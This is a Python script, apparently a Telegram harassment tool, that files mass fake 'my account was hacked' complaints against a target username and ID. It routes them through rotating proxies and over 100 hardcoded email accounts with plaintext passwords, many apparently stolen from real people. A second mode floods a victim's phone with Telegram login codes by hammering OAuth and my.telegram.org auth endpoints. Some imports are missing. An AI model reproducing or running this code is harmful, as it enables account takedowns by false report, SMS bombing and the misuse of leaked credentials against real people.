from fake_useragent import UserAgent
import requests
import random
from termcolor import colored
import pyfiglet
import socket
import datetime
import re
import os
import time


def generate_phone_number():
    
    country_codes = ['+7']
    
    
    country_code = random.choice(country_codes)
    
    srv = ['927', '937', '993', '952', '950', '926', '918']
    
    srv_code = random.choice(srv)
    
    phone_number = ''.join(random.choices('0123456789', k=7))
    
  
    formatted_phone_number = f'{country_code}{srv_code}{phone_number}'
    
    return formatted_phone_number

import string

def generate_random_email():
   
	  
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "telekill"]
    
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))  
    domain = random.choice(domains) 
    
    email = f"{username}@{domain}"  
    
    return email
    
banner = pyfiglet.figlet_format(" FELIX_335")
color_banner = colored(banner, color= 'white')

number = {
    "+79967285422",
    "+79269736273",
    "+79963668355",
    "+79661214909",
    "+79254106650",
    "+22666228126",
    "+79269069196",
    "+79315894431",
    "+79621570718",
}

email = {'korlithiobtennick@mail.ru',
'avyavya.vyaavy@mail.ru',
'gdfds98@mail.ru',
'dfsdfdsfdf51@mail.ru',
'aria.therese.svensson@mail.com',
'taterbug@verizon.net',
'ejbrickner@comcast.net',
'teressapeart@cox.net',
'liznees@verizon.net',
'olajakubovich@mail.com',
'kcdg@charter.net',
'bean_118@hotmail.com',
'dsdhjas@mail.com',
'robitwins@comcast.net',
'wasina@live.com',
'aruzhan.01@mail.com',
'rob.tackett@live.com',
'lindahallenbeck@verizon.net',
'hlaw82@mail.com',
'paintmadman@comcast.net',
'prideandjoy@verizon.net',
'sdgdfg56@mail.com',
'garrett.danelz@comcast.net',
'gillian_1211@hotmail.com',
'sunpit16@hotmail.com',
'fdshelor@verizon.net'}


senders = {
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'charlotte2850@hotmail.com': 'kelalu2850',
'raumonatuhadi@mail.ru': 'a7r6U9J6KHDaguAsidDH',
'floworadpewoodvi@mail.ru': 'ZcyUg5MUq8jMr9i8aST1',
'letzegebquirdisnui@mail.ru': 'abniAcbrCjRskpysMc75',
'millveramontmoni@mail.ru': 'bLd8Zg4tqfxmUq7KW5jW',
'letkixipromnussi@mail.ru': 'bNraxddiagE9Sx23SxYt',
'hotriosmartraverba@mail.ru': 'cALqh0bjnPefyiu7WL0v',
'pillgemisscritcomsa@mail.ru': 'dHBUrMg6aqXhvx0m1cVf',
'leigedeamvebig@mail.ru': 'dVTsGqDbZYbjse9iHNR2',
'knocrufridunringgent@mail.ru': 'dn333DbbuEfGnqw08Rxm',
'tworensodiapansaa@mail.ru': 'dsGajJE1TtiAGgZsgyvQ',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'terbgebuoviror@mail.ru': 'gaqaKs06xg22kkXXW2LU',
'tioreibunthandvahear@mail.ru': 'ggKygTjxSLzwm4tWd43B',
'lovedel.anisss@mail.ru': 'cJkiz18MAWS0L85DGW8n',
'love.efs@mail.ru': 'vzw5bwePbzeXhYhDeeA1',
'fsadfsaf.sdfasdfas@mail.ru': 'KUN0wpJbViwpFXFPkHb4',
'fkjvfmdsof@mail.ru': 'CxM2JUT0vx03aSyD53Ns',
'sawage.dasha@mail.ru': 'SyfStmkgK29KUB0BQVAy',
'opunm.sdaww@mail.ru': 'Y1BjSZCHeLTxmvaW49FH',
'fall.gall@mail.ru': 'tFqTgMUqkidcBbw91hD7',
'wzxcvd@mail.ru': 'vwPUnRUGW75MUKaFzhVc',
'masha.mashala@mail.ru': 'rtM0rCSHZstDVQpxmEkh',
'wwagege@mail.ru': 'ZZNkRLrZseLN57phVeEQ',
'irigjfodjdkdkk@mail.ru': 'n8r0TKCygC5xqaWxStr1',
'sdfghafdhg@mail.ru': 'Kag0fefn6mFWMzQ17PGb',
'dasha.goat@mail.ru': '3bkf9iHyuFUfEfKzXYLm',
'dasha.sasaas@mail.ru': 'UAVwCgpFXaD2zcQ9gVSE',
'dasha.lovely.02@mail.ru': 'paUrCHANKWWxefzaQvQm',
'dasha.butifull@mail.ru': '0bAbKQUfpVRDcrLtc0Ya',
'firirotifigj@gmail.com': 'RQCgW8vb127AGRZ5Kvf1',
'dasha.mdaaa@gmail.com': 'HXNg0M0bvyaEs1tbMjTB',
'lfwgdg@mail.ru': 'h6hAUvp3KNPqqcmmduU3',
'dasha.holle@mail.ru': '0g5g6kwEtkKw2hYCaSTj',
'darya.holly@mail.ru': 'he02duEXu4iiDambB6ZG',
'dasha.vonk@mail.ru': 'AayKrKyfEDyeubmRqKRm',
'kloxc@mail.ru': 'FVUeii2MdbNcqEmZrq7N'
}
receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org,support@telegram.org, dmca@telegram.org, security@telegram.org, sms@telegram.org, info@telegram.org, marta@telegram.org, spam@telegram.org, alex@telegram.org, abuse@telegram.org, pavel@telegram.org, durov@telegram.org, elies@telegram.org, ceo@telegram.org, mr@telegram.org, levlam@telegram.org, perekopsky@telegram.org, recover@telegram.org, germany@telegram.org, hyman@telegram.org, qa@telegram.org, Stickers@telegram.org, ir@telegram.org, vadim@telegram.org, shyam@telegram.org, stopca@telegram.org, >support@telegram.org, ask@telegram.org, 125support@telegram.org, me@telegram.org, enquiries@telegram.org, api_support@telegram.org, marketing@telegram.org, ca@telegram.org, recovery@telegram.org, http@telegram.org, corp@telegram.org, corona@telegram.org, ton@telegram.org, sticker@telegram.org']


def send_email(receiver, sender_email, sender_password, subject, body):
	try:
		msg = MIMEMultipart()
		msg['From'] = sender_email
		msg['To'] = receiver
		msg.attach(MIMEText(body, 'plain'))
		server = smtplib.SMTP('smtp.mail.ru', 587)
		server.starttls()
		server.login(sender_email, sender_password)
		server.sendmail(sender_email, receiver, msg.as_string())
		time.sleep(1)
		server.quit()
		return True
	except Exception as e:
		return False

    

    
def send_complaint(username, telegram_id, number, email, repeats, complaint_choice, proxies=None):
	url = 'https://telegram.org/support'
	user_agent = UserAgent().random
	headers = {'User-Agent': user_agent}
	complaints_sent = 0

	
	if complaint_choice == "1": 
		text = f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {username}, а мой айди, если злоумышленник поменял юзернейм —  {telegram_id} . Мой телефон: {number} Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
	
       
	payload = {'text': text, 'number': number, 'email': email}

	try:
		for _ in range(int(repeats)):
			response = requests.post(url, headers=headers, data=payload, proxies=proxies)
			if response.status_code == 200:
				complaints_sent += 1
				print(colored("Жалоба успешно отправлена. ", "green"))
				print(colored(F"От: {email} - {number}", 'cyan'))
				print(colored(f"Текст:\n{text}", 'red'))
				
			else:
				print("Не удалось отправить. code:", response.status_code)
	except Exception as e:
		print("An error occurred:", str(e))



  



def complaint():
	print(color_banner)
	print(colored("1. Снос сессий", "red"))
	print(colored("2. Флуд кодами","red"))
	complaint_choice = input(colored("Выберите номер: ", "red"))

	if complaint_choice in ["1"]:
		username = input("Введите @username: ")
		telegram_id = input("Введите Telegram ID: ")
		number = input("Введите номер: "  )
		for _ in range(500):
			number = generate_phone_number()
			email = generate_random_email()
			proxies_list = [
            '8.218.149.193:80',
            '47.57.233.126:80',
            '47.243.70.197:80',
            '8.222.193.208:80',
            '144.24.85.158:80',
            '47.245.115.6:80',
            '47.245.114.163:80'
            '45.4.55.10:40486', 
            '103.52.37.1:4145',
             '200.34.227.204:4153', 
             '190.109.74.1:33633',
             '200.54.221.202:4145', 
             '36.67.66.202:5678',
             '168.121.139.199:4145',
             '101.255.117.2:51122',
             '45.70.0.250:4145',
             '78.159.199.217:1080', 
             '67.206.213.202:4145', 
             '14.161.48.4:4153',
             '119.10.179.33:5430',
             '109.238.222.1:4153',
             '103.232.64.226:4145',
             '183.88.212.247:1080', 
             '116.58.227.197:4145', 
             '1.20.97.181:34102', 
             '103.47.93.214:1080',
              '89.25.23.211:4153', 
              '185.43.249.132:39316',
              '188.255.209.149:1080',
              '178.216.2.229:1488', 
               '92.51.73.14:4153', 
              '109.200.156.2:4153',
               '89.237.33.193:51549',
               '211.20.145.204:4153', 
               '45.249.79.185:3629',
                '208.113.223.164:21829',
                '62.133.136.75:4153', 
                '46.99.135.154:4153', 
                '1.20.198.254:4153',
                '196.6.234.140:4153', 
                '118.70.196.124:4145',
                '185.34.22.225:46169',
                '103.47.93.199:1080',
                 '222.129.34.122:57114',
                 '92.247.127.249:4153',
                 '186.150.207.141:1080',
                 '202.144.201.197:43870',
                 '103.106.32.105:31110', 
                 '200.85.137.46:4153',
                 '116.58.254.9:4145', 
                 '101.51.141.122:4153',
                 '83.69.125.126:4145',
                 '187.62.88.9:4153', 
                 '122.54.134.176:4145', 
                 '170.0.203.11:1080', 
                 '187.4.165.90:4153',
                 '159.224.243.185:61303',
                 '103.15.242.216:55492', 
                 '187.216.81.183:37640',
                 '176.197.100.134:3629', 
                 '101.51.105.41:4145',
                 '46.13.11.82:4153', 
                 '103.221.254.125:40781', 
                 '177.139.130.157:4153', 
                 '1.10.189.133:50855', 
                 '69.70.59.54:4153', 
                 '83.103.195.183:4145', 
                 '190.109.168.241:42732',
                 '103.76.20.155:43818',
                 '84.47.226.66:4145', 
                 '1.186.60.25:4153',
                 '93.167.67.69:4145',
                 '202.51.112.22:5430', 
                 '213.6.204.153:42820',
                 '184.178.172.14:4145', 
                 '217.171.62.42:4153',
                 '121.13.229.213:61401',
                 '101.255.140.101:1081',
                  '78.189.64.42:4145',
                  '187.11.232.71:4153', 
                  '190.184.201.146:32606',                           '195.34.221.81:4153', 
                  '200.29.176.174:4145', 
                  '103.68.35.162:4145', 
                  '194.135.97.126:4145',
                  '167.172.123.221:9200',
                  '200.218.242.89:4153',
                  '190.7.141.66:40225',
                  '186.103.154.235:4153',
                  '118.174.196.250:4153',
                  '213.136.89.190:52010',
                  '217.25.221.60:4145',
                  '50.192.195.69:39792',
                  '180.211.162.114:44923',                           '179.1.1.11:4145', 
                  '41.162.94.52:30022',
                  '103.211.11.13:52616',
                  '103.209.65.12:6667',
                  '101.51.121.29:4153',
                  '190.13.82.242:4153', 
                  '103.240.33.185:8291',
                  '202.51.100.33:5430',
                  '201.220.128.92:3000', 
                  '177.11.75.18:51327',
                  '62.122.201.170:31871', 
                  '79.164.171.32:50059',
                  '202.124.46.97:4145', 
                  '79.132.205.34:61731',
                  '217.29.18.206:4145',
                  '222.217.68.17:35165',
                  '105.29.95.34:4153', 
                  '103.226.143.254:1080',
                  '119.82.251.250:31678', 
                  '45.232.226.137:52104',
                  '195.69.218.198:60687', 
                  '155.133.83.161:58351', 
                  '213.108.216.59:1080', 
                  '178.165.91.245:3629',
                  '124.158.150.205:4145',
                  '36.72.118.156:4145', 
                  '177.93.79.18:4145', 
                  '103.47.94.97:1080', 
                  '78.140.7.239:40009', 
                  '187.19.150.221:80', 
                  '103.192.156.171:4145', 
                  '36.67.27.189:49524', 
                  '188.136.167.33:4145', 
                  '91.226.5.245:36604', 
                  '78.90.81.184:42636', 
                  '189.52.165.134:1080', 
                  '81.183.253.34:4145', 
                  '95.154.104.147:31387', 
                  '220.133.209.253:4145', 
                  '182.52.108.104:14153', 
                  '195.93.173.24:9050', 
                  '170.244.64.129:31476', 
                  '117.102.124.234:4145', 
                  '190.210.3.210:1080', 
                  '182.253.142.11:4145', 
                  '176.98.156.64:4145', 
                  '210.48.139.228:4145', 
                  '177.39.218.70:4153', 
                  '112.78.134.229:41517', 
                  '119.46.2.245:4145', 
                  '103.212.94.253:41363', 
                  '190.109.72.41:33633', 
                  '103.94.133.94:4153', 
                  '190.151.94.2:56093', 
                  '190.167.220.7:4153', 
                  '94.136.154.53:60030', 
                  '103.206.253.59:53934', 
                  '69.163.160.185:29802', 
                  '213.6.221.162:5678', 
                  '96.9.86.70:53304', 
                  '202.182.54.186:4145', 
                  '192.140.42.83:59057', 
                  '138.121.198.90:42494', 
                  '190.121.142.166:4153', 
                  '190.0.242.217:51327', 
                  '103.35.108.145:4145', 
                  '82.114.83.238:4153', 
                  '195.22.253.235:4145', 
                  '91.219.100.72:4153', 
                  '212.3.109.7:4145', 
                  '45.7.177.226:39867', 
                  '202.5.37.241:49151', 
                  '195.9.89.66:3629', 
                  '190.186.1.46:33567', 
                  '69.163.161.118:20243'
			]
			proxies = {'http': random.choice(proxies_list)}
			send_complaint(username, telegram_id, number, email, 1, complaint_choice, proxies)
	
			for sender_email, sender_password in senders.items():
				text = f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {username}, а мой айди, если злоумышленник поменял юзернейм —  {telegram_id} . Мой телефон: {number} Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
				for receiver in receivers:
					comp_text = text
					comp_body = comp_text.format(username=username.strip(), telegram_id=telegram_id.strip())
					send_email(receiver, sender_email, sender_password, 'Report an account.', comp_body)
					print(colored(f"Жалоба успешно отправлена. ", "green"))
					print(colored(f"От: {email} - {number}", 'cyan'))
					print(colored(f"Текст:\n{text}", 'red'))
					time.sleep(1)

	if complaint_choice in ["2"]:
        
		number = int(input(colored("Введите номер: ", "red")))

		try:
			for _ in range(127):
				user = UserAgent().random
				headers = {'user-agent': user}


				requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
				requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number}) 
				requests.post('https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F, ', headers=headers, data={'phone': number})  
				requests.post('https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin, ', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F, ', headers=headers, data={'phone': number})  
				requests.post('https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F, ', headers=headers, data={'phone': number}) 
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number}) 
				requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
				requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', headers = headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', headers = headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', headers = headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
				requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
				print(colored(f"Коды успешно отправлены", 'cyan'))
		except Exception as e:
			print(e)

        
complaint()